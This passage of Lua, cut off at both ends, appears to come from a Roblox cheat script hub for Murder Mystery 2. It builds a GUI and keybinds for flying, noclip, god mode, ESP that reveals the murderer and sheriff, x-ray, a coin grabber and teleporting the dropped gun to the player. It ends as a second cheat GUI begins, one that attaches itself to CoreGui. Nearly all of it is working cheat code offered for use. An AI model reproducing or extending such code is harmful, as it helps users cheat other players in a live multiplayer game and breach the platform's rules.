		BG.P = 9e4
		BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		BG.cframe = T.CFrame
		BV.velocity = Vector3.new(0, 0.1, 0)
		BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
		spawn(function()
			repeat wait()
				LP.Character.Humanoid.PlatformStand = true
				if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
					SPEED = 50
				elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
					SPEED = 0
				end
				if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
					BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
					lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
				elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
					BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
				else
					BV.velocity = Vector3.new(0, 0.1, 0)
				end
				BG.cframe = workspace.CurrentCamera.CoordinateFrame
			until not FLYING
			CONTROL = {F = 0, B = 0, L = 0, R = 0}
			lCONTROL = {F = 0, B = 0, L = 0, R = 0}
			SPEED = 0
			BG:destroy()
			BV:destroy()
			LP.Character.Humanoid.PlatformStand = false
		end)
	end
	
	mouse.KeyDown:connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = 1
		elseif KEY:lower() == 's' then
			CONTROL.B = -1
		elseif KEY:lower() == 'a' then
			CONTROL.L = -1 
		elseif KEY:lower() == 'd' then 
			CONTROL.R = 1
		end
	end)
	
	mouse.KeyUp:connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = 0
		elseif KEY:lower() == 's' then
			CONTROL.B = 0
		elseif KEY:lower() == 'a' then
			CONTROL.L = 0
		elseif KEY:lower() == 'd' then
			CONTROL.R = 0
		end
	end)
	FLY()
end

function NOFLY() --Unfly function
	FLYING = false
	LP.Character.Humanoid.PlatformStand = false
end

local noclipcoro = coroutine.wrap(function() --Noclip function
	while true do
		if NClip == true then
			if game.Players ~= nil then
				if game.Players.LocalPlayer ~= nil then
					if game.Players.LocalPlayer.Character ~= nil then
						if game.Players.LocalPlayer.Character:FindFirstChild("Torso") ~= nil then
							if game.Players.LocalPlayer.Character:FindFirstChild("Head") ~= nil then
								game.Players.LocalPlayer.Character.Torso.CanCollide = false
								game.Players.LocalPlayer.Character.Head.CanCollide = false
							end
						end
					end
				end
			end
		end
	game:service("RunService").Stepped:wait()
	end
end)

noclipcoro() --For noclip to work

game:GetService("Players").LocalPlayer.CharacterAdded:connect(function(character) --Resets specific things for ease
	flyvar = false
	FlyActive.Text = "Inactive"
	FlyActive.TextColor3 = Color3.new(1, 0, 1)
	godmodevar = false
	GodModeActive.Text = "Inactive"
	GodModeActive.TextColor3 = Color3.new(1, 0, 1)
	Clear()
	MSESPActive.Text = "Inactive"
	MSESPActive.TextColor3 = Color3.new(1, 0, 1)
	PlayersEspActive.Text = "Inactive"
	PlayersEspActive.TextColor3 = Color3.new(1, 0, 1)
	EspOffActive.Text = "Active"
	EspOffActive.TextColor3 = Color3.new(0, 1, 0)
end)

mouse.KeyDown:connect(function(KeyDown) --If shift is held, run
	if KeyDown == "0" and runActive == false and keyOff == false then
		runActive = true
		player.Character.Humanoid.WalkSpeed = 32
		RunActiveGui.Text = "Active"
		RunActiveGui.TextColor3 = Color3.new(0, 1, 0)
	end
end)

mouse.KeyUp:connect(function(KeyUp) --If shift is released, walk
	if KeyUp == "0" and runActive == true and keyOff == false then
		runActive = false
		player.Character.Humanoid.WalkSpeed = 16
		RunActiveGui.Text = "Inactive"
		RunActiveGui.TextColor3 = Color3.new(1, 0, 1)
	end
end)

function coingrabberfunc() --Coin grabber function
	local children = game.Workspace:GetChildren()
	for _, child in pairs(children) do
  		for _, child in pairs(child:GetChildren()) do
       		table.insert(children, child)
  		 end
  		 if child:IsA("BasePart") and child.Name == "Coin" then
         	child.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		end
  	end
end

function godmodefunc() --Godmode function
	local player = game.Players.LocalPlayer
	if player.Character then
		if player.Character:FindFirstChild("Humanoid") then
			player.Character.Humanoid.Name = "1"
		end
		local l = player.Character["1"]:Clone()
		l.Parent = player.Character
		l.Name = "Humanoid"; wait(0.1)
		player.Character["1"]:Destroy()
		workspace.CurrentCamera.CameraSubject = player.Character.Humanoid
		player.Character.Animate.Disabled = true; wait(0.1)
		player.Character.Animate.Disabled = false
	end
end

--Coin Grabber--
Coin.Name = "CoinGrabber"
Coin.Parent = Main
Coin.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
Coin.BorderColor3 = Color3.new(0, 0.607843, 1)
Coin.BorderSizePixel = 5
Coin.Position = UDim2.new(0, 0, 0.215, 0)
Coin.Size = UDim2.new(1.005, 0, 0.08, 0)
Coin.ZIndex = 4
Coin.Font = Enum.Font.SciFi
Coin.FontSize = Enum.FontSize.Size24
Coin.Text = "Coin Grabber ["..string.upper(coinkey).."]"
Coin.TextColor3 = Color3.fromRGB(255, 255, 26)
Coin.TextSize = 20
Coin.TextWrapped = true
Coin.MouseButton1Down:connect(function(x, y)
	coingrabberfunc()
end)

--Murderer/Sheriff Esp--
MSESPActive.Name = "MSEspActive"
MSESPActive.Parent = Main
MSESPActive.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
MSESPActive.BorderColor3 = Color3.new(0, 0.607843, 1)
MSESPActive.BorderSizePixel = 5
MSESPActive.Position = UDim2.new(0.755, 0, 0.315, 0)
MSESPActive.Size = UDim2.new(0.25, 0, 0.08, 0)
MSESPActive.ZIndex = 4
MSESPActive.Font = Enum.Font.SciFi
MSESPActive.FontSize = Enum.FontSize.Size24
MSESPActive.Text = "Inactive"
MSESPActive.TextColor3 = Color3.new(1, 0, 1)
MSESPActive.TextSize = 20
MSESPActive.TextWrapped = true

MSEsp.Name = "MSEsp"
MSEsp.Parent = Main
MSEsp.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
MSEsp.BorderColor3 = Color3.new(0, 0.607843, 1)
MSEsp.BorderSizePixel = 5
MSEsp.Position = UDim2.new(0, 0, 0.315, 0)
MSEsp.Size = UDim2.new(0.75, 0, 0.08, 0)
MSEsp.ZIndex = 4
MSEsp.Font = Enum.Font.SciFi
MSEsp.FontSize = Enum.FontSize.Size24
MSEsp.Text = "Murderer/Sheriff Esp ["..string.upper(MSkey).."]"
MSEsp.TextColor3 = Color3.fromRGB(255, 102, 255)
MSEsp.TextSize = 20
MSEsp.TextWrapped = true
MSEsp.MouseButton1Down:connect(function(x, y)
	murderer = "None"
	sheriff = "None"
	Clear()
	findmurderer()
	findsheriff()
	if printvar == true then
		print("Murderer/Sheriff")
	end
	MSESPActive.Text = "Active"
	MSESPActive.TextColor3 = Color3.new(0, 1, 0)
	PlayersEspActive.Text = "Inactive"
	PlayersEspActive.TextColor3 = Color3.new(1, 0, 1)
	EspOffActive.Text = "Inactive"
	EspOffActive.TextColor3 = Color3.new(1, 0, 1)
end)

--All Players Esp
PlayersEspActive.Name = "PlayersEspActive"
PlayersEspActive.Parent = Main
PlayersEspActive.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
PlayersEspActive.BorderColor3 = Color3.new(0, 0.607843, 1)
PlayersEspActive.BorderSizePixel = 5
PlayersEspActive.Position = UDim2.new(0.755, 0, 0.415, 0)
PlayersEspActive.Size = UDim2.new(0.25, 0, 0.08, 0)
PlayersEspActive.ZIndex = 4
PlayersEspActive.Font = Enum.Font.SciFi
PlayersEspActive.FontSize = Enum.FontSize.Size24
PlayersEspActive.Text = "Inactive"
PlayersEspActive.TextColor3 = Color3.new(1, 0, 1)
PlayersEspActive.TextSize = 20
PlayersEspActive.TextWrapped = true

PlayersEsp.Name = "PlayersEsp"
PlayersEsp.Parent = Main
PlayersEsp.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
PlayersEsp.BorderColor3 = Color3.new(0, 0.607843, 1)
PlayersEsp.BorderSizePixel = 5
PlayersEsp.Position = UDim2.new(0, 0, 0.415, 0)
PlayersEsp.Size = UDim2.new(0.75, 0, 0.08, 0)
PlayersEsp.ZIndex = 4
PlayersEsp.Font = Enum.Font.SciFi
PlayersEsp.FontSize = Enum.FontSize.Size24
PlayersEsp.Text = "All Players Esp ["..string.upper(playerskey).."]"
PlayersEsp.TextColor3 = Color3.fromRGB(102, 255, 51)
PlayersEsp.TextSize = 20
PlayersEsp.TextWrapped = true
PlayersEsp.MouseButton1Down:connect(function(x, y)
	Clear()
	if printvar == true then
		print("Players Esp")
	end
	MSESPActive.Text = "Inactive"
	MSESPActive.TextColor3 = Color3.new(1, 0, 1)
	PlayersEspActive.Text = "Active"
	PlayersEspActive.TextColor3 = Color3.new(0, 1, 0)
	EspOffActive.Text = "Inactive"
	EspOffActive.TextColor3 = Color3.new(1, 0, 1)
	findplayers()
end)

--Esp Off
EspOffActive.Name = "EspOffActive"
EspOffActive.Parent = Main
EspOffActive.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
EspOffActive.BorderColor3 = Color3.new(0, 0.607843, 1)
EspOffActive.BorderSizePixel = 5
EspOffActive.Position = UDim2.new(0.755, 0, 0.515, 0)
EspOffActive.Size = UDim2.new(0.25, 0, 0.08, 0)
EspOffActive.ZIndex = 4
EspOffActive.Font = Enum.Font.SciFi
EspOffActive.FontSize = Enum.FontSize.Size24
EspOffActive.Text = "Active"
EspOffActive.TextColor3 = Color3.new(0, 1, 0)
EspOffActive.TextSize = 20
EspOffActive.TextWrapped = true

EspOff.Name = "EspOff"
EspOff.Parent = Main
EspOff.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
EspOff.BorderColor3 = Color3.new(0, 0.607843, 1)
EspOff.BorderSizePixel = 5
EspOff.Position = UDim2.new(0, 0, 0.515, 0)
EspOff.Size = UDim2.new(0.75, 0, 0.08, 0)
EspOff.ZIndex = 4
EspOff.Font = Enum.Font.SciFi
EspOff.FontSize = Enum.FontSize.Size24
EspOff.Text = "Esp Off ["..string.upper(espoffkey).."]"
EspOff.TextColor3 = Color3.fromRGB(255, 255, 255)
EspOff.TextSize = 20
EspOff.TextWrapped = true
EspOff.MouseButton1Down:connect(function(x, y)
	Clear()
	if printvar == true then
		print("Esp Off")
	end
	MSESPActive.Text = "Inactive"
	MSESPActive.TextColor3 = Color3.new(1, 0, 1)
	PlayersEspActive.Text = "Inactive"
	PlayersEspActive.TextColor3 = Color3.new(1, 0, 1)
	EspOffActive.Text = "Active"
	EspOffActive.TextColor3 = Color3.new(0, 1, 0)
end)

--Run
RunActiveGui.Name = "RunActiveGui"
RunActiveGui.Parent = Main
RunActiveGui.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
RunActiveGui.BorderColor3 = Color3.new(0, 0.607843, 1)
RunActiveGui.BorderSizePixel = 5
RunActiveGui.Position = UDim2.new(0.755, 0, 0.615, 0)
RunActiveGui.Size = UDim2.new(0.25, 0, 0.08, 0)
RunActiveGui.ZIndex = 4
RunActiveGui.Font = Enum.Font.SciFi
RunActiveGui.FontSize = Enum.FontSize.Size24
RunActiveGui.Text = "Inactive"
RunActiveGui.TextColor3 = Color3.new(1, 0, 1)
RunActiveGui.TextSize = 20
RunActiveGui.TextWrapped = true

Run.Name = "Run"
Run.Parent = Main
Run.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
Run.BorderColor3 = Color3.new(0, 0.607843, 1)
Run.BorderSizePixel = 5
Run.Position = UDim2.new(0, 0, 0.615, 0)
Run.Size = UDim2.new(0.75, 0, 0.08, 0)
Run.ZIndex = 4
Run.Font = Enum.Font.SciFi
Run.FontSize = Enum.FontSize.Size24
Run.Text = "Run [Shift]"
Run.TextColor3 = Color3.fromRGB(255, 51, 0)
Run.TextSize = 20
Run.TextWrapped = true
Run.MouseButton1Down:connect(function(x, y)
	if runActive == false then
		runActive = true
		player.Character.Humanoid.WalkSpeed = 32
		RunActiveGui.Text = "Active"
		RunActiveGui.TextColor3 = Color3.new(0, 1, 0)
	elseif runActive == true then
		runActive = false
		player.Character.Humanoid.WalkSpeed = 16
		RunActiveGui.Text = "Inactive"
		RunActiveGui.TextColor3 = Color3.new(1, 0, 1)
	end
end)

--Fly
FlyActive.Name = "FlyActive"
FlyActive.Parent = Main
FlyActive.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
FlyActive.BorderColor3 = Color3.new(0, 0.607843, 1)
FlyActive.BorderSizePixel = 5
FlyActive.Position = UDim2.new(0.755, 0, 0.715, 0)
FlyActive.Size = UDim2.new(0.25, 0, 0.08, 0)
FlyActive.ZIndex = 4
FlyActive.Font = Enum.Font.SciFi
FlyActive.FontSize = Enum.FontSize.Size24
FlyActive.Text = "Inactive"
FlyActive.TextColor3 = Color3.new(1, 0, 1)
FlyActive.TextSize = 20
FlyActive.TextWrapped = true

Fly.Name = "Fly"
Fly.Parent = Main
Fly.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
Fly.BorderColor3 = Color3.new(0, 0.607843, 1)
Fly.BorderSizePixel = 5
Fly.Position = UDim2.new(0, 0, 0.715, 0)
Fly.Size = UDim2.new(0.75, 0, 0.08, 0)
Fly.ZIndex = 4
Fly.Font = Enum.Font.SciFi
Fly.FontSize = Enum.FontSize.Size24
Fly.Text = "Fly ["..string.upper(flykey).."]"
Fly.TextColor3 = Color3.fromRGB(204, 255, 255)
Fly.TextSize = 20
Fly.TextWrapped = true
Fly.MouseButton1Down:connect(function(x, y)
	if flyvar == false then
		sFLY()
		flyvar = true
		FlyActive.Text = "Active"
		FlyActive.TextColor3 = Color3.new(0, 1, 0)
	elseif flyvar == true then
		flyvar = false
		NOFLY()
		FlyActive.Text = "Inactive"
		FlyActive.TextColor3 = Color3.new(1, 0, 1)
	end
end)

--Noclip
NoclipActive.Name = "NoclipActive"
NoclipActive.Parent = Main
NoclipActive.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
NoclipActive.BorderColor3 = Color3.new(0, 0.607843, 1)
NoclipActive.BorderSizePixel = 5
NoclipActive.Position = UDim2.new(0.755, 0, 0.815, 0)
NoclipActive.Size = UDim2.new(0.25, 0, 0.08, 0)
NoclipActive.ZIndex = 4
NoclipActive.Font = Enum.Font.SciFi
NoclipActive.FontSize = Enum.FontSize.Size24
NoclipActive.Text = "Inactive"
NoclipActive.TextColor3 = Color3.new(1, 0, 1)
NoclipActive.TextSize = 20
NoclipActive.TextWrapped = true

Noclip.Name = "Noclip"
Noclip.Parent = Main
Noclip.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
Noclip.BorderColor3 = Color3.new(0, 0.607843, 1)
Noclip.BorderSizePixel = 5
Noclip.Position = UDim2.new(0, 0, 0.815, 0)
Noclip.Size = UDim2.new(0.75, 0, 0.08, 0)
Noclip.ZIndex = 4
Noclip.Font = Enum.Font.SciFi
Noclip.FontSize = Enum.FontSize.Size24
Noclip.Text = "Noclip ["..string.upper(noclipkey).."]"
Noclip.TextColor3 = Color3.fromRGB(0, 102, 255)
Noclip.TextSize = 20
Noclip.TextWrapped = true
Noclip.MouseButton1Down:connect(function(x, y)
	if NClip == false then
		NClip = true
		if printvar == true then
			print("Noclip Enabled")
		end
		NoclipActive.Text = "Active"
		NoclipActive.TextColor3 = Color3.new(0, 1, 0)
	elseif NClip == true then
		NClip = false
		if printvar == true then
			print("Noclip Disabled")
		end
		NoclipActive.Text = "Inactive"
		NoclipActive.TextColor3 = Color3.new(1, 0, 1)
	end
end)

--GodMode
GodModeActive.Name = "GodModeActive"
GodModeActive.Parent = Main
GodModeActive.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
GodModeActive.BorderColor3 = Color3.new(0, 0.607843, 1)
GodModeActive.BorderSizePixel = 5
GodModeActive.Position = UDim2.new(0.755, 0, 0.915, 0)
GodModeActive.Size = UDim2.new(0.25, 0, 0.08, 0)
GodModeActive.ZIndex = 4
GodModeActive.Font = Enum.Font.SciFi
GodModeActive.FontSize = Enum.FontSize.Size24
GodModeActive.Text = "Inactive"
GodModeActive.TextColor3 = Color3.new(1, 0, 1)
GodModeActive.TextSize = 20
GodModeActive.TextWrapped = true

GodMode.Name = "GodMode"
GodMode.Parent = Main
GodMode.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
GodMode.BorderColor3 = Color3.new(0, 0.607843, 1)
GodMode.BorderSizePixel = 5
GodMode.Position = UDim2.new(0, 0, 0.915, 0)
GodMode.Size = UDim2.new(0.75, 0, 0.08, 0)
GodMode.ZIndex = 4
GodMode.Font = Enum.Font.SciFi
GodMode.FontSize = Enum.FontSize.Size24
GodMode.Text = "God Mode ["..string.upper(godmodekey).."]"
GodMode.TextColor3 = Color3.fromRGB(255, 255, 255)
GodMode.TextSize = 20
GodMode.TextWrapped = true
GodMode.MouseButton1Down:connect(function(x, y)
	if godmodevar == false then
		GodModeActive.Text = "Active"
		GodModeActive.TextColor3 = Color3.new(0, 1, 0)
		godmodevar = true
		godmodefunc()
	end
end)

--Xray On
GuiXrayOnActive.Name = "GuiXrayOnActive"
GuiXrayOnActive.Parent = Main
GuiXrayOnActive.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
GuiXrayOnActive.BorderColor3 = Color3.new(0, 0.607843, 1)
GuiXrayOnActive.BorderSizePixel = 5
GuiXrayOnActive.Position = UDim2.new(0.755, 0, 1.015, 0)
GuiXrayOnActive.Size = UDim2.new(0.25, 0, 0.08, 0)
GuiXrayOnActive.ZIndex = 4
GuiXrayOnActive.Font = Enum.Font.SciFi
GuiXrayOnActive.FontSize = Enum.FontSize.Size24
GuiXrayOnActive.Text = "Inactive"
GuiXrayOnActive.TextColor3 = Color3.new(1, 0, 1)
GuiXrayOnActive.TextSize = 20
GuiXrayOnActive.TextWrapped = true

GuiXrayOn.Name = "XrayOn"
GuiXrayOn.Parent = Main
GuiXrayOn.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
GuiXrayOn.BorderColor3 = Color3.new(0, 0.607843, 1)
GuiXrayOn.BorderSizePixel = 5
GuiXrayOn.Position = UDim2.new(0, 0, 1.015, 0)
GuiXrayOn.Size = UDim2.new(0.75, 0, 0.08, 0)
GuiXrayOn.ZIndex = 4
GuiXrayOn.Font = Enum.Font.SciFi
GuiXrayOn.FontSize = Enum.FontSize.Size24
GuiXrayOn.Text = "Xray On ["..string.upper(xrayonkey).."]"
GuiXrayOn.TextColor3 = Color3.fromRGB(255, 204, 102)
GuiXrayOn.TextSize = 20
GuiXrayOn.TextWrapped = true
GuiXrayOn.MouseButton1Down:connect(function(x, y)
	GuiXrayOnActive.Text = "Active"
	GuiXrayOnActive.TextColor3 = Color3.new(0, 1, 0)
	GuiXrayOffActive.Text = "Inactive"
	GuiXrayOffActive.TextColor3 = Color3.new(1, 0, 1)
	XrayOn(obj)
end)

--Xray Off
GuiXrayOffActive.Name = "GuiXrayOffActive"
GuiXrayOffActive.Parent = Main
GuiXrayOffActive.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
GuiXrayOffActive.BorderColor3 = Color3.new(0, 0.607843, 1)
GuiXrayOffActive.BorderSizePixel = 5
GuiXrayOffActive.Position = UDim2.new(0.755, 0, 1.115, 0)
GuiXrayOffActive.Size = UDim2.new(0.25, 0, 0.08, 0)
GuiXrayOffActive.ZIndex = 4
GuiXrayOffActive.Font = Enum.Font.SciFi
GuiXrayOffActive.FontSize = Enum.FontSize.Size24
GuiXrayOffActive.Text = "Active"
GuiXrayOffActive.TextColor3 = Color3.new(0, 1, 0)
GuiXrayOffActive.TextSize = 20
GuiXrayOffActive.TextWrapped = true

GuiXrayOff.Name = "XrayOff"
GuiXrayOff.Parent = Main
GuiXrayOff.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
GuiXrayOff.BorderColor3 = Color3.new(0, 0.607843, 1)
GuiXrayOff.BorderSizePixel = 5
GuiXrayOff.Position = UDim2.new(0, 0, 1.115, 0)
GuiXrayOff.Size = UDim2.new(0.75, 0, 0.08, 0)
GuiXrayOff.ZIndex = 4
GuiXrayOff.Font = Enum.Font.SciFi
GuiXrayOff.FontSize = Enum.FontSize.Size24
GuiXrayOff.Text = "Xray Off ["..string.upper(xrayoffkey).."]"
GuiXrayOff.TextColor3 = Color3.fromRGB(255, 153, 51)
GuiXrayOff.TextSize = 20
GuiXrayOff.TextWrapped = true
GuiXrayOff.MouseButton1Down:connect(function(x, y)
	GuiXrayOnActive.Text = "Inactive"
	GuiXrayOnActive.TextColor3 = Color3.new(1, 0, 1)
	GuiXrayOffActive.Text = "Active"
	GuiXrayOffActive.TextColor3 = Color3.new(0, 1, 0)
	XrayOff(obj)
end)

--Bring Gun to You
BringGun.Name = "BringGun"
BringGun.Parent = Main
BringGun.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
BringGun.BorderColor3 = Color3.new(0, 0.607843, 1)
BringGun.BorderSizePixel = 5
BringGun.Position = UDim2.new(0, 0, 1.215, 0)
BringGun.Size = UDim2.new(1.005, 0, 0.08, 0)
BringGun.ZIndex = 4
BringGun.Font = Enum.Font.SciFi
BringGun.FontSize = Enum.FontSize.Size24
BringGun.Text = "Teleport Gun ["..string.upper(bringgunkey).."]"
BringGun.TextColor3 = Color3.fromRGB(0, 255, 0)
BringGun.TextSize = 20
BringGun.TextWrapped = true
BringGun.MouseButton1Down:connect(function(x, y)
	if game.Workspace.GunDrop.CFrame ~= nil then
		game.Workspace.GunDrop.CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame
	else
		if printvar == true then
			print("Gun not currently dropped")
		end
	end
end)

--Keybinds
KeybindsActive.Name = "KeybindsActive"
KeybindsActive.Parent = Main
KeybindsActive.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
KeybindsActive.BorderColor3 = Color3.new(0, 0.607843, 1)
KeybindsActive.BorderSizePixel = 5
KeybindsActive.Position = UDim2.new(0.755, 0, 1.315, 0)
KeybindsActive.Size = UDim2.new(0.25, 0, 0.08, 0)
KeybindsActive.ZIndex = 4
KeybindsActive.Font = Enum.Font.SciFi
KeybindsActive.FontSize = Enum.FontSize.Size24
KeybindsActive.Text = "Active"
KeybindsActive.TextColor3 = Color3.new(0, 1, 0)
KeybindsActive.TextSize = 20
KeybindsActive.TextWrapped = true

Keybinds.Name = "Keybinds"
Keybinds.Parent = Main
Keybinds.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
Keybinds.BorderColor3 = Color3.new(0, 0.607843, 1)
Keybinds.BorderSizePixel = 5
Keybinds.Position = UDim2.new(0, 0, 1.315, 0)
Keybinds.Size = UDim2.new(0.75, 0, 0.08, 0)
Keybinds.ZIndex = 4
Keybinds.Font = Enum.Font.SciFi
Keybinds.FontSize = Enum.FontSize.Size24
Keybinds.Text = "Keybinds [Ctrl]"
Keybinds.TextColor3 = Color3.fromRGB(255, 255, 255)
Keybinds.TextSize = 20
Keybinds.TextWrapped = true
Keybinds.MouseButton1Down:connect(function(x, y)
	if keyOff == true then
		keyOff = false
		KeybindsActive.Text = "Active"
		KeybindsActive.TextColor3 = Color3.new(0, 1, 0)
	elseif keyOff == false then
		keyOff = true
		KeybindsActive.Text = "Inactive"
		KeybindsActive.TextColor3 = Color3.new(1, 0, 1)
	end
end)

Show.Name = "Show"
Show.Parent = MM2
Show.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
Show.BorderColor3 = Color3.new(0, 0.607843, 1)
Show.BorderSizePixel = 5
Show.Position = UDim2.new(0, 0, 0.85799998, 0)
Show.Size = UDim2.new(0.08, 0, 0.04, 0)
Show.ZIndex = 4
Show.Font = Enum.Font.SciFi
Show.FontSize = Enum.FontSize.Size24
Show.Text = "Show ["..string.upper(hideshowguikey).."]"
Show.TextColor3 = Color3.new(0, 0.333333, 1)
Show.TextSize = 20
Show.TextWrapped = true
Show.Visible = false

Hide.Name = "Hide"
Hide.Parent = Main
Hide.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
Hide.BorderColor3 = Color3.new(0, 0.607843, 1)
Hide.BorderSizePixel = 5
Hide.Position = UDim2.new(0, 0, 1.415, 0)
Hide.Size = UDim2.new(1.005, 0, 0.08, 0)
Hide.ZIndex = 4
Hide.Font = Enum.Font.SciFi
Hide.FontSize = Enum.FontSize.Size24
Hide.Text = "Hide ["..string.upper(hideshowguikey).."]"
Hide.TextColor3 = Color3.new(0, 0.333333, 1)
Hide.TextSize = 20
Hide.TextWrapped = true

Hide.MouseButton1Down:connect(function(x, y)
	if showvar == true then
		showvar = false
		Main.Visible = false
		Show.Visible = true
		if printvar == true then
			print("Hidden")
		end
	end
end)

Show.MouseButton1Down:connect(function(x, y)
	if showvar == false then
		showvar = true
		Show.Visible = false
		Main.Visible = true
		if printvar == true then
			print("Shown")
		end
	end
end)

inputcode.InputBegan:connect(function(input)
	if input.KeyCode == Enum.KeyCode.LeftControl then
		if keyOff == true then
			keyOff = false
			KeybindsActive.Text = "Active"
			KeybindsActive.TextColor3 = Color3.new(0, 1, 0)
		elseif keyOff == false then
			keyOff = true
			KeybindsActive.Text = "Inactive"
			KeybindsActive.TextColor3 = Color3.new(1, 0, 1)
		end
	end
end)

mouse.keyDown:connect(function(key)
	if keyOff == false then
		if key == coinkey then --Coin Grabber
			coingrabberfunc()
		elseif key == MSkey then --Murderer/Sheriff Esp On
			murderer = "None"
			sheriff = "None"
			Clear()
			findmurderer()
			findsheriff()
			if printvar == true then
				print("Murderer/Sheriff")
			end
			MSESPActive.Text = "Active"
			MSESPActive.TextColor3 = Color3.new(0, 1, 0)
			PlayersEspActive.Text = "Inactive"
			PlayersEspActive.TextColor3 = Color3.new(1, 0, 1)
			EspOffActive.Text = "Inactive"
			EspOffActive.TextColor3 = Color3.new(1, 0, 1)
		elseif key == playerskey then --Player Esp On
			Clear()
			MSESPActive.Text = "Inactive"
			MSESPActive.TextColor3 = Color3.new(1, 0, 1)
			PlayersEspActive.Text = "Active"
			PlayersEspActive.TextColor3 = Color3.new(0, 1, 0)
			EspOffActive.Text = "Inactive"
			EspOffActive.TextColor3 = Color3.new(1, 0, 1)
			findplayers()
			if printvar == true then
				print("Players")
			end
		elseif key == espoffkey then --Esp off
			Clear()
			if printvar == true then
				print("Esp Disabled")
			end
			MSESPActive.Text = "Inactive"
			MSESPActive.TextColor3 = Color3.new(1, 0, 1)
			PlayersEspActive.Text = "Inactive"
			PlayersEspActive.TextColor3 = Color3.new(1, 0, 1)
			EspOffActive.Text = "Active"
			EspOffActive.TextColor3 = Color3.new(0, 1, 0)
		elseif key == flykey then --Fly
			if flyvar == false then
				sFLY()
				flyvar = true
				FlyActive.Text = "Active"
				FlyActive.TextColor3 = Color3.new(0, 1, 0)
			elseif flyvar == true then
				flyvar = false
				NOFLY()
				FlyActive.Text = "Inactive"
				FlyActive.TextColor3 = Color3.new(1, 0, 1)
			end
		elseif key == noclipkey then --Noclip toggle
			if NClip == false then
				NClip = true
				if printvar == true then
					print("Noclip Enabled")
				end
				NoclipActive.Text = "Active"
				NoclipActive.TextColor3 = Color3.new(0, 1, 0)
			elseif NClip == true then
				NClip = false
				if printvar == true then
					print("Noclip Disabled")
				end
				NoclipActive.Text = "Inactive"
				NoclipActive.TextColor3 = Color3.new(1, 0, 1)
			end
		elseif key == godmodekey then --Godmode
			if godmodevar == false then
				godmodevar = true
				godmodefunc()
				GodModeActive.Text = "Active"
				GodModeActive.TextColor3 = Color3.new(0, 1, 0)
			end
		elseif key == xrayonkey then --Xray On
			GuiXrayOnActive.Text = "Active"
			GuiXrayOnActive.TextColor3 = Color3.new(0, 1, 0)
			GuiXrayOffActive.Text = "Inactive"
			GuiXrayOffActive.TextColor3 = Color3.new(1, 0, 1)
			XrayOn(obj)
		elseif key == xrayoffkey then --Xray Off
			GuiXrayOnActive.Text = "Inactive"
			GuiXrayOnActive.TextColor3 = Color3.new(1, 0, 1)
			GuiXrayOffActive.Text = "Active"
			GuiXrayOffActive.TextColor3 = Color3.new(0, 1, 0)
			XrayOff(obj)
		elseif key == bringgunkey then --Teleport Gun to You
			if game.Workspace.GunDrop.CFrame ~= nil then
				game.Workspace.GunDrop.CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame
			else
				if printvar == true then
					print("Gun not currently dropped")
				end
			end
		elseif key == hideshowguikey then --Show/Hide Gui
			if showvar == false then
				showvar = true
				Show.Visible = false
				Main.Visible = true
				if printvar == true then
					print("Shown")
				end
			elseif showvar == true then
				showvar = false
				Main.Visible = false
				Show.Visible = true
				if printvar == true then
					print("Hidden")
				end
			end
		end
	end
end)
end
end)

Section:NewButton("MM2 GUI 8", "LOOKS LIKE PC", function()
--murder mystery 2 script by niko#1809
--have fun :>

local pez = {};

pez.initiated = false;

local tabs = 0;

function pez:init()
    local nikopez = Instance.new("ScreenGui")
    local exframe = Instance.new("Frame")

    nikopez.Name = "nikopez"
    nikopez.Parent = game.CoreGui
    nikopez.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

